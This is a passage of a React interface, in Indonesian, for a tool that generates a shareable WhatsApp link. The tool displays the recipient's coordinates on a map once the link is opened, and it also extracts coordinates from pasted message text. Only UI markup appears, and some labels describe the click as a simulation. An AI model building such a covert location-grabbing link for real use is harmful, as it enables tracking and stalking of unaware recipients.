            <button
              type="button"
              onClick={() => setStatusNotice(null)}
              className="text-emerald-700 hover:text-emerald-950"
            >
              <X className="w-4 h-4" />
            </button>
          </div>
        )}

        {/* Highlighted Instant Coordinate Output right at the top so the location is immediately visible! */}
        {activeResult && (
          <section className="p-5 rounded-lg bg-slate-900 text-white flex flex-col lg:flex-row lg:items-center justify-between gap-4 border border-slate-800">
            <div className="space-y-1">
              <div className="text-xs text-emerald-400 font-semibold">
                LOKASI PENERIMA LANGSUNG TERLIHAT · {activeResult.detectionMethod}
              </div>
              <div className="text-2xl sm:text-3xl font-bold font-mono tabular-nums text-white tracking-tight">
                {activeResult.latitude.toFixed(6)}, {activeResult.longitude.toFixed(6)}
              </div>
              <div className="text-xs text-slate-300">
                Latitude: <strong className="font-mono tabular-nums text-white">{activeResult.latitude.toFixed(6)}</strong> · Longitude: <strong className="font-mono tabular-nums text-white">{activeResult.longitude.toFixed(6)}</strong> · DMS: <span className="font-mono tabular-nums text-emerald-300">{activeResult.dmsString}</span>
              </div>
              <div className="text-xs text-slate-100 pt-0.5 font-medium">
                Lokasi Terdeteksi: {activeResult.locationLabel}
              </div>
            </div>

            <div className="flex flex-wrap items-center gap-2 shrink-0">
              <button
                type="button"
                onClick={() =>
                  handleCopyText(
                    `${activeResult.latitude.toFixed(6)}, ${activeResult.longitude.toFixed(6)}`,
                    `banner-${activeResult.id}`
                  )
                }
                className="inline-flex items-center gap-1.5 px-3.5 py-2 text-xs font-semibold text-slate-900 bg-white hover:bg-slate-100 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
              >
                {copiedId === `banner-${activeResult.id}` ? (
                  <>
                    <Check className="w-3.5 h-3.5 text-emerald-600" />
                    <span>Koordinat Tersalin</span>
                  </>
                ) : (
                  <>
                    <Copy className="w-3.5 h-3.5" />
                    <span>Salin Koordinat</span>
                  </>
                )}
              </button>

              <a
                href={`https://www.google.com/maps?q=${activeResult.latitude},${activeResult.longitude}`}
                target="_blank"
                rel="noopener noreferrer"
                className="inline-flex items-center gap-1.5 px-3.5 py-2 text-xs font-semibold text-white bg-emerald-600 hover:bg-emerald-700 rounded-md transition-colors whitespace-nowrap shrink-0"
              >
                <span>Buka Google Maps</span>
                <ExternalLink className="w-3.5 h-3.5" />
              </a>

              <button
                type="button"
                onClick={() => handleDeleteResult(activeResult.id)}
                className="inline-flex items-center gap-1.5 px-3.5 py-2 text-xs font-medium text-red-200 bg-red-950/80 hover:bg-red-900 border border-red-800 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
                title="Hapus hasil pencarian ini"
              >
                <Trash2 className="w-3.5 h-3.5" />
                <span>Hapus</span>
              </button>
            </div>
          </section>
        )}

        {/* Top 2 Methods Grid: Method 1 (Dynamic Link + Live Click Process) & Method 2 (Copied Text) */}
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-stretch">
          {/* METODE 1: Link Dinamis Acak & Visualisasi Proses Saat Diklik Penerima */}
          <section
            id="tautan-gps"
            className="lg:col-span-7 bg-white border border-slate-200 rounded-lg p-6 flex flex-col justify-between"
          >
            <div>
              <div className="flex flex-wrap items-center justify-between gap-2 pb-4 mb-4 border-b border-slate-200">
                <div>
                  <div className="text-xs text-slate-500 mb-0.5">
                    Metode 1 · Link Dinamis Acak & Proses Otomatis
                  </div>
                  <h2 className="text-base font-bold text-slate-900 font-display">
                    Proses Saat Link yang Dibagikan Diklik & Dibuka oleh Penerima
                  </h2>
                </div>
                <button
                  type="button"
                  onClick={() => {
                    setIsRecipientView(true);
                    runLinkOpenedProcess({
                      fromRecipientScreen: true,
                      triggerReason: 'Membuka tampilan layar penerima saat klik link',
                    });
                  }}
                  className="px-2.5 py-1.5 text-xs font-medium text-slate-700 bg-slate-100 hover:bg-slate-200 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
                >
                  Lihat Layar Penerima
                </button>
              </div>

              <div className="space-y-3">
                <div>
                  <label className="block text-xs font-medium text-slate-700 mb-1">
                    Nama Penerima / Nomor WhatsApp (Opsional — Bisa Ketik Kota/Daerah)
                  </label>
                  <input
                    type="text"
                    value={senderLabelForLink}
                    onChange={(e) => setSenderLabelForLink(e.target.value)}
                    placeholder="Contoh: Budi (0812xxxx) atau Andi Surabaya..."
                    className="w-full px-3 py-2 text-xs bg-slate-50 border border-slate-200 rounded-md focus:outline-none focus:border-slate-900"
                  />
                </div>

                <div>
                  <div className="flex items-center justify-between gap-2 mb-1">
                    <label className="block text-xs font-medium text-slate-700">
                      Link Dinamis Acak (Klik Link atau Salin untuk Memulai Proses)
                    </label>
                    <span className="text-[11px] font-mono tabular-nums text-slate-500">
                      Kode: #{dynamicToken} · {tokenGeneratedAt}
                    </span>
                  </div>
                  <div className="flex flex-wrap sm:flex-nowrap items-center gap-2">
                    <button
                      type="button"
                      onClick={() =>
                        runLinkOpenedProcess({
                          fromRecipientScreen: false,
                          triggerReason: `Link ${shareableLink} diklik langsung`,
                        })
                      }
                      title="Klik link ini untuk langsung menjalankan proses saat link dibuka penerima"
                      className="w-full text-left px-3 py-2 text-xs font-mono bg-emerald-50/60 hover:bg-emerald-100/70 border border-emerald-300 rounded-md text-emerald-950 font-semibold transition-colors cursor-pointer truncate"
                    >
                      {shareableLink}
                    </button>
                    <button
                      type="button"
                      onClick={handleRefreshDynamicLink}
                      disabled={gpsLoading}
                      className="inline-flex items-center gap-1.5 px-3 py-2 text-xs font-medium text-slate-700 bg-slate-100 hover:bg-slate-200 border border-slate-200 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
                      title="Acak ulang link dinamis baru & jalankan proses"
                    >
                      <RefreshCw className={`w-3.5 h-3.5 ${gpsLoading ? 'animate-spin' : ''}`} />
                      <span>Refresh Link</span>
                    </button>
                    <button
                      type="button"
                      onClick={() => handleCopyAndTrackLink(shareableLink, 'copy-link')}
                      className="inline-flex items-center gap-1.5 px-3.5 py-2 text-xs font-semibold text-white bg-slate-900 hover:bg-slate-800 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
                    >
                      {copiedId === 'copy-link' ? (
                        <>
                          <Check className="w-3.5 h-3.5 text-emerald-400" />
                          <span>Tersalin & Diproses</span>
                        </>
                      ) : (
                        <>
                          <Copy className="w-3.5 h-3.5" />
                          <span>Salin Link</span>
                        </>
                      )}
                    </button>
                  </div>
                </div>
              </div>

              {/* Visualisasi 4 Tahap Proses + Progress Bar + Live Log */}
              <div className="mt-5 pt-4 border-t border-slate-200 space-y-3">
                <div>
                  <div className="flex items-center justify-between gap-2 mb-1.5">
                    <span className="text-xs font-semibold text-slate-900">
                      Alur Proses Saat Link Diklik & Dibuka oleh Penerima:
                    </span>
                    <span className="text-xs font-mono font-bold text-emerald-700 tabular-nums">
                      {processStage === 4
                        ? '100% · LOKASI TERLIHAT'
                        : `${processProgressPct}% · TAHAP ${processStage}/4`}
                    </span>
                  </div>
                  <div className="w-full h-2 bg-slate-100 rounded-full overflow-hidden border border-slate-200">
                    <div
                      className="h-full bg-emerald-600 transition-all duration-300"
                      style={{ width: `${processProgressPct}%` }}
                    />
                  </div>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                  {processSteps.map((s) => {
                    const isCompleted = processStage > s.step || processStage === 4;
                    const isActive = processStage === s.step && processStage !== 4;
                    return (
                      <div
                        key={s.step}
                        className={`p-2.5 rounded-md border text-xs flex items-start justify-between gap-2 transition-colors ${
                          isCompleted
                            ? 'bg-emerald-50/80 border-emerald-200 text-slate-900'
                            : isActive
                            ? 'bg-slate-900 border-slate-900 text-white'
                            : 'bg-slate-50 border-slate-200 text-slate-500'
                        }`}
                      >
                        <div className="min-w-0">
                          <div className="font-semibold truncate">{s.title}</div>
                          <div
                            className={`text-[11px] truncate mt-0.5 ${
                              isActive ? 'text-slate-300' : 'text-slate-500'
                            }`}
                          >
                            {s.desc}
                          </div>
                        </div>
                        <div className="shrink-0 mt-0.5">
                          {isCompleted ? (
                            <CheckCircle2 className="w-4 h-4 text-emerald-600" />
                          ) : isActive ? (
                            <Loader2 className="w-4 h-4 animate-spin text-emerald-400" />
                          ) : null}
                        </div>
                      </div>
                    );
                  })}
                </div>

                {/* Live Activity Log showing exact real-time process */}
                <div className="bg-slate-900 text-slate-100 rounded-md p-3 font-mono text-[11px] space-y-1 max-h-36 overflow-y-auto border border-slate-800">
                  <div className="text-slate-400 pb-1 border-b border-slate-800 flex items-center justify-between">
                    <span>LOG PROSES REAL-TIME SAAT LINK DIBUKA PENERIMA</span>
                    <span className="text-emerald-400">AKTIF</span>
                  </div>
                  {processLogs.length === 0 ? (
                    <div className="text-slate-400 py-1">{processDetailText}</div>
                  ) : (
                    processLogs.map((log) => (
                      <div key={log.id} className="leading-relaxed">
                        <span className="text-slate-400">[{log.time}]</span>{' '}
                        <span className="text-emerald-400 font-semibold">[Tahap {log.stage}]</span>{' '}
                        <span className="text-slate-100">{log.message}</span>
                      </div>
                    ))
                  )}
                </div>
              </div>
            </div>

            <div className="pt-4 mt-4 border-t border-slate-200 flex flex-wrap items-center justify-between gap-2">
              <button
                type="button"
                onClick={() => handleCopyAndTrackLink(shareableLink, 'copy-wa-msg')}
                className="inline-flex items-center gap-1.5 px-3 py-2 text-xs font-medium text-slate-700 bg-slate-100 hover:bg-slate-200 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
              >
                <Send className="w-3.5 h-3.5" />
                <span>
                  {copiedId === 'copy-wa-msg'
                    ? 'Link Tersalin & Proses Berjalan'
                    : 'Salin Link untuk Chat WA'}
                </span>
              </button>

              <button
                type="button"
                onClick={() =>
                  runLinkOpenedProcess({
                    fromRecipientScreen: false,
                    triggerReason: `Simulasi klik & buka link ${shareableLink} oleh penerima`,
                  })
                }
                disabled={gpsLoading}
                className="inline-flex items-center gap-2 px-4 py-2.5 text-xs font-semibold text-white bg-emerald-600 hover:bg-emerald-700 disabled:opacity-50 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
              >
                {gpsLoading ? (
                  <>
                    <Loader2 className="w-4 h-4 animate-spin" />
                    <span>Memproses Lokasi Penerima...</span>
                  </>
                ) : (
                  <>
                    <MousePointerClick className="w-4 h-4" />
                    <span>Klik & Buka Link (Tampilkan Lokasi Sekarang)</span>
                  </>
                )}
              </button>
            </div>
          </section>

          {/* METODE 2: Cari Titik Koordinat dari Teks Pesan WhatsApp yang Dicopy */}
          <section
            id="pencarian-teks"
            className="lg:col-span-5 bg-white border border-slate-200 rounded-lg p-6 flex flex-col justify-between"
          >
            <div>
              <div className="pb-4 mb-4 border-b border-slate-200">
                <div className="text-xs text-slate-500 mb-0.5">
                  Metode 2 · Ekstraksi dari Teks Pesan Terakhir
                </div>
                <h2 className="text-base font-bold text-slate-900 font-display">
                  Cari Titik Koordinat dari Teks yang Sudah Dicopy
                </h2>
              </div>

              <p className="text-xs text-slate-600 leading-relaxed mb-3">
                Tempelkan teks pesan WhatsApp yang sudah Anda salin (*copy*) atau langsung klik tombol pencarian di bawah untuk mengekstrak koordinatnya.
              </p>

              <div className="relative">
                <textarea
                  ref={textareaRef}
                  value={messageInput}
                  onChange={(e) => setMessageInput(e.target.value)}
                  onPaste={handleTextareaPaste}
                  rows={8}
                  placeholder="Tempel (Paste / Ctrl+V) teks pesan WhatsApp yang sudah dicopy di sini..."
                  className="w-full p-3.5 pr-10 text-xs font-mono bg-slate-50 border border-slate-200 rounded-lg text-slate-900 focus:outline-none focus:border-slate-900 resize-y"
                />
                {messageInput && (
                  <button
                    type="button"
                    onClick={() => setMessageInput('')}
                    className="absolute right-3 top-3 text-slate-400 hover:text-slate-700 cursor-pointer"
                    title="Bersihkan teks"
                  >
                    <X className="w-4 h-4" />
                  </button>
                )}
              </div>
            </div>

            <div className="pt-4 mt-5 border-t border-slate-200 flex items-center justify-end">
              <button
                type="button"
                onClick={handleSearchFromCopiedText}
                className="w-full inline-flex items-center justify-center gap-2 px-5 py-2.5 text-xs font-semibold text-white bg-slate-900 hover:bg-slate-800 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
              >
                <Search className="w-4 h-4" />
                <span>Cari Titik Koordinat dari Teks yang Dicopy</span>
              </button>
            </div>
          </section>
        </div>

        {/* Search Results & Map Grid */}
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
          {/* Left Column: Daftar Hasil Pencarian (with Delete Button on every item) */}
          <section
            id="hasil-pencarian"
            className="lg:col-span-6 bg-white border border-slate-200 rounded-lg overflow-hidden"
          >
            <div className="p-5 border-b border-slate-200 flex items-center justify-between gap-4">
              <div>
                <h2 className="text-base font-semibold text-slate-900">
                  Hasil Pencarian Titik Koordinat ({allResults.length})
                </h2>
                <p className="text-xs text-slate-500 mt-0.5">
                  Menampilkan lokasi yang diperoleh saat link dibuka maupun dari teks pesan WA.
                </p>
              </div>

              <div className="flex items-center gap-2">
                {allResults.length > 0 && (
                  <button
                    type="button"
                    onClick={handleDeleteAllResults}
                    className="inline-flex items-center gap-1.5 px-3 py-1.5 text-xs font-medium text-red-700 bg-red-50 hover:bg-red-100 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
                  >
                    <Trash2 className="w-3.5 h-3.5" />
                    <span>Hapus Semua</span>
                  </button>
                )}
              </div>
            </div>

            {allResults.length === 0 ? (
              <div className="p-10 text-center">
                <MapPin className="w-8 h-8 text-slate-400 mx-auto mb-2.5" />
                <div className="text-sm font-semibold text-slate-900">
                  Belum Ada Lokasi yang Masuk
                </div>
                <p className="text-xs text-slate-500 max-w-sm mx-auto mt-1">
                  Klik langsung pada link dinamis atau tekan tombol <strong>Klik &amp; Buka Link (Tampilkan Lokasi Sekarang)</strong> di atas.
                </p>
              </div>
            ) : (
              <div className="divide-y divide-slate-200">
                {allResults.map((item, idx) => {
                  const isSelected = activeResult?.id === item.id;
                  const coordPair = `${item.latitude.toFixed(6)}, ${item.longitude.toFixed(6)}`;

                  return (
                    <div
                      key={item.id}
                      onClick={() => setSelectedResultId(item.id)}
                      className={`p-5 cursor-pointer transition-colors ${
                        isSelected ? 'bg-emerald-50/50' : 'hover:bg-slate-50'
                      }`}
                    >
                      <div className="flex items-start justify-between gap-3 mb-2">
                        <div className="text-xs text-slate-500">
                          <strong className="font-mono tabular-nums text-slate-900">
                            #{idx + 1}
                          </strong>{' '}
                          · {item.sender} · {item.messageTime} · {item.detectionMethod}
                        </div>

                        <button
                          type="button"
                          onClick={(e) => {
                            e.stopPropagation();
                            handleDeleteResult(item.id);
                          }}
                          className="inline-flex items-center gap-1 px-2.5 py-1 text-xs font-medium text-red-700 bg-red-50 hover:bg-red-100 rounded transition-colors whitespace-nowrap shrink-0 cursor-pointer"
                          title="Hapus hasil pencarian ini"
                        >
                          <Trash2 className="w-3.5 h-3.5" />
                          <span>Hapus</span>
                        </button>
                      </div>

                      <div className="p-3 rounded-md bg-white border border-slate-200 mb-2.5 flex flex-wrap items-center justify-between gap-2">
                        <div>
                          <div className="text-[11px] text-slate-500">
                            Titik Koordinat (Latitude, Longitude)
                          </div>
                          <div className="text-base font-bold font-mono tabular-nums text-emerald-700">
                            {coordPair}
                          </div>
                          <div className="text-[11px] font-mono tabular-nums text-slate-500">
                            DMS: {item.dmsString}
                          </div>
                        </div>

                        <div
                          className="flex items-center gap-1.5"
                          onClick={(e) => e.stopPropagation()}
                        >
                          <button
                            type="button"
                            onClick={() => handleCopyText(coordPair, item.id)}
                            className="inline-flex items-center gap-1 px-2.5 py-1.5 text-xs font-medium text-slate-700 bg-slate-100 hover:bg-slate-200 rounded transition-colors whitespace-nowrap shrink-0 cursor-pointer"
                          >
                            {copiedId === item.id ? (
                              <>
                                <Check className="w-3.5 h-3.5 text-emerald-600" />
                                <span>Tersalin</span>
                              </>
                            ) : (
                              <>
                                <Copy className="w-3.5 h-3.5" />
                                <span>Salin</span>
                              </>
                            )}
                          </button>

                          <a
                            href={`https://www.google.com/maps?q=${item.latitude},${item.longitude}`}
                            target="_blank"
                            rel="noopener noreferrer"
                            className="inline-flex items-center gap-1 px-2.5 py-1.5 text-xs font-medium text-emerald-700 bg-emerald-50 hover:bg-emerald-100 rounded transition-colors whitespace-nowrap shrink-0"
                          >
                            <span>Peta</span>
                            <ExternalLink className="w-3 h-3" />
                          </a>
                        </div>
                      </div>

                      <div className="text-xs text-slate-800 font-medium mb-1">
                        Lokasi: {item.locationLabel}
                      </div>
                      <div className="text-xs text-slate-500 font-mono bg-slate-100/80 px-2.5 py-1.5 rounded border border-slate-200/80 break-words">
                        "{item.rawMessage}"
                      </div>
                    </div>
                  );
                })}
              </div>
            )}
          </section>

          {/* Right Column: Interactive Map */}
          <section
            id="peta-lokasi"
            className="lg:col-span-6 bg-white border border-slate-200 rounded-lg p-4 flex flex-col lg:sticky lg:top-20"
          >
            <div className="pb-3 mb-3 border-b border-slate-200 px-2">
              <h2 className="text-base font-semibold text-slate-900">
                Peta Titik Koordinat
              </h2>
              <p className="text-xs text-slate-500 mt-0.5">
                Menampilkan posisi titik koordinat secara langsung saat link dibuka penerima.
              </p>
            </div>

            <div className="h-[460px]">
              <InteractiveMap
                locations={mapLocations}
                selectedId={activeResult?.id || null}
                onSelectLocation={(id) => setSelectedResultId(id)}
              />
            </div>
          </section>
        </div>
      </main>
    </div>
  );
}
